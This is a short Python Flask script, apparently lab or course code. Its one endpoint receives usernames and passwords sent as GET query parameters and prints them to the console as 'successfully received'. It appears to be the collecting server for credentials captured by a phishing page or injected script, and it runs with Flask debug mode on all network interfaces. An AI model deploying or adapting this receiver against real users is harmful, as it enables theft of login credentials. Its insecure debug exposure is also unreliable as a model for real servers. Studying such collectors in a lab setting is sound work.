from VL2 import app
from flask import request 


@app.route("/main", methods=["GET", "POST"])
def main():
    
    if request.method == "GET":
        print("\n" + "="*40 )
        print("Username  :", request.args.get("username"))
        print("Password  :", request.args.get("password"))
        print("Erfolgreich empfangen!")

        print("="*40 + "\n")
    return "ok", 200
    

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)

# python -m VL2.cookie



